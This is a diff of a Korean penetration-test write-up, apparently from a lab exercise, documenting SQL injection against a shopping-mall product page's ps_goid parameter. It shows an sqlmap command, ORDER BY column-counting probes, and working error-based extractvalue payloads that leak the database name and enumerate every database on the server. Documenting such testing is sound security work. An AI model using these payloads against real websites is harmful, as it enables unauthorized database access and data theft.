@@ -18,35 +18,77 @@
 
 ##### 나. 제품 상세 페이지 URL 분석 (ps_goid=' 주입)
 * **현황:** 제품 상세 정보 페이지의 URL 파라미터값에 싱글 쿼테이션(`'`)을 주입함.
-	`http://192.168.20.123/m_mall_detail.php?ps_ctid=03070000&ps_goid='`
+	`.../m_mall_detail.php?ps_ctid=03070000&ps_goid='`
 
 ![[SQL_Injection_취약점탐색2.png]]
 
 * **분석 결과: **`!!coreMall(MySQL DB ERROR)!!` 메시지와 함께 내부 쿼리의 일부인 `and approval_date > 0` 구문이 노출됨.
 - **취약점 판단:** 애플리케이션에서 입력값에 대한 적절한 필터링이 이루어지지 않아 내부 쿼리 구조가 노출되었으며, 이를 통해 데이터베이스 내부의 민감 정보를 추출하는 **Union-Based SQL Injection** 공격이 가능함을 시사함.
 
-#### 2단계: 컬럼 개수 파악 (ORDER BY 및 Troubleshooting)
-데이터 추출을 위해 기존 쿼리의 컬럼 개수를 특정하는 단계입니다. 자동화 도구의 분석 한계를 파악하고 수동 정밀 분석을 통해 정확한 값을 도출하는 과정을 포함합니다.
+#### 2단계: 컬럼 개수 식별 및 공격 기법 전환
 
-- **방법:** `ORDER BY` 절의 숫자를 증분하며 응답 변화를 확인하거나, 자동화 도구(`sqlmap`)를 활용하여 컬럼 개수를 식별함.
+데이터 추출의 초석이 되는 컬럼 개수를 파악하고, 웹 애플리케이션의 응답 특성에 맞춘 최적의 공격 기법을 도출하는 단계입니다.
 
-##### 가. 자동화 도구 분석 (sqlmap)
+##### 가. 자동화 도구 분석 및 오탐 식별
+
+- **분석 내용:** 효율적인 분석을 위해 `sqlmap`을 활용하여 취약점 스캐닝을 수행함.
 ![[SQL_Injection_취약점탐색3.png]]
-- **현황:** 효율적인 분석을 위해 `sqlmap`을 실행하여 컬럼 개수 분석을 우선 시도함.
-- **분석 결과:** `sqlmap` 로그 상에서 `target URL appears to have 17 columns`라는 결과를 얻었으나, 해당 결과값(17개)으로 `UNION` 공격 시도 시 `Error 1222 (Different number of columns)`가 발생하며 실패함.
-- **분석:** 웹 애플리케이션의 복잡한 쿼리 구조나 서버 설정으로 인해 자동화 도구의 오탐(False Positive)이 발생한 것으로 판단됨.
+- **사용 명령어:** `sqlmap -u ".../m_mall_detail.php?ps_ctid=03070000&ps_goid=1" --batch --technique=U`
 
-##### 나. 수동 분석 (ORDER BY)
-- **현황:** 도구의 오탐을 인지하고, `ORDER BY` 구문을 이용해 수동으로 임계값을 재측정함.
-- **공격 구문:** - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 10%23` (정상)
-    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 80%23` (정상)
-    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 81%23` (에러 발생)
-- **최종 결과:** `ORDER BY 80%23`까지 정상 응답을 확인하였으며, 이를 통해 해당 페이지의 SQL 쿼리가 총 **80개**의 컬럼을 조회하고 있음을 최종 확정함.
+- **결과:** 도구는 17개의 컬럼으로 판단하여 아래와 같은 구문을 생성 및 주입함.
+	- **주입 구문:** `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' UNION ALL SELECT NULL,NULL, ... (총 17개) ... %23`
+	- **오류 발생:** `Error 1222: Different number of columns` (원본 쿼리와의 컬럼 수 불일치 확인)
 
-##### 다. 취약점 판단
-- **취약점 판단:** 매우 많은 수의 컬럼(80개)이 사용되는 복잡한 환경임에도 불구하고, 입력값 검증 부재로 인해 대규모 `UNION` 구문 주입이 가능한 결함이 확인됨.
+- **원인 분석:** 타겟 환경의 복잡한 SQL 쿼리 구조나 파라미터 간의 상관관계로 인해 자동화 도구의 오탐(False Positive)이 발생한 것으로 판단됨.
 
+##### 나. 수동 분석을 통한 컬럼 개수 확정
 
+- **분석 방법:** `UNION SELECT` 공격을 수행하기 위해서는 원본 쿼리가 사용하는 컬럼의 개수와 공격 구문의 컬럼 개수가 반드시 일치해야 함. 이를 위해 결과 집합을 특정 컬럼 기준으로 정렬하는 `ORDER BY` 절을 사용하여, 에러가 발생하기 직전의 숫자를 통해 원본 쿼리의 컬럼 개수를 파악함.
+
+- **분석 과정:**
+    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 17%23` : 정상 응답 (자동화 도구가 식별한 17개 지점에서 정상 작동 확인)
+    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 80%23` : 정상 응답 (순차적 증가를 통해 80번째 컬럼까지 데이터가 존재함을 확인)
+    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 81%23` : 에러 발생 (존재하지 않는 81번째 컬럼 참조로 인한 쿼리 오류 발생)
+
+- **결론:** `ORDER BY` 숫자를 높여가며 응답의 변화를 탐지한 결과, 해당 페이지의 원본 쿼리는 **총 80개**의 컬럼으로 구성되어 있음을 최종 확정함.
+
+##### 다. Union-Based 공격의 한계 및 Error-Based 전환
+
+- **문제 발생:** 확정된 80개의 컬럼을 바탕으로 `UNION SELECT 1,2...80%23`을 주입하였으나, 화면이나 소스 코드(View Source) 상에 주입한 데이터가 전혀 노출되지 않는 출력 지점 부재(No Display Point) 현상이 발생함.
+
+- **해결 방안:** 화면 출력에 의존하지 않고, 서버가 반환하는 SQL 에러 메시지에 데이터를 강제로 포함시키는 **Error-Based SQL Injection** 기법으로 전략을 수정함.
+
+##### 라. 최종 공격 성공 및 데이터베이스 식별
+
+- **공격 구문:** `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' and extractvalue(1,concat(0x3a,database()))%23`
+
+- **최종 응답:**
+![[SQL_Injection_취약점탐색4.png]]
+	**XPATH syntax error: ':fsk_m_db'** > **Mysql Error Num : 1105**
+
+- **결과 분석:** `extractvalue` 함수의 XML 파싱 에러를 유도하여 데이터베이스명인 **`fsk_m_db`**를 성공적으로 탈취함.
+#### 3단계: 전체 데이터베이스 목록 추출
+
+성공적으로 식별된 **Error-Based SQL Injection** 취약점을 활용하여, 현재 접속 중인 데이터베이스 외에 서버 내에 존재하는 전체 데이터베이스 목록을 열거(Enumeration)하는 단계입니다.
+
+##### 가. 분석 배경 및 공격 전술
+
+- **공격 근거:** 앞선 단계에서 `database()` 함수를 이용해 현재 DB명인 `fsk_m_db`를 탈취하는 데 성공함. 이는 서버가 `extractvalue()`와 같은 함수에 의해 발생하는 XML 파싱 에러 메시지를 필터링 없이 화면에 출력하고 있음을 의미함.
+
+- **공격 전술:** 해당 취약점이 확인됨에 따라, MySQL의 메타데이터(모든 DB, 테이블 정보 등)가 저장된 **`information_schema`** 시스템 데이터베이스에 접근하여 서버의 전체 구조를 파악하기로 결정함.
+
+##### 나. 실행 및 결과
+
+- **분석 방법:** `information_schema.schemata` 테이블을 조회하고, `limit` 절을 이용하여 에러 메시지 창에 한 개씩 DB명을 출력시킴.
+
+- **공격 구문:** - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' and extractvalue(1,concat(0x3a,(select schema_name from information_schema.schemata limit 0,1)))%23`
+
+- **추출 결과:**
+    - **limit 0,1:** `information_schema`
+    - **limit 1,1:** `fsk_m_db`
+    - **limit 2,1:** `mysql`
+    - **limit 3,1:** `phpmyadmin`
+    - **limit 4,1:** `test_db`
 ---
 
 
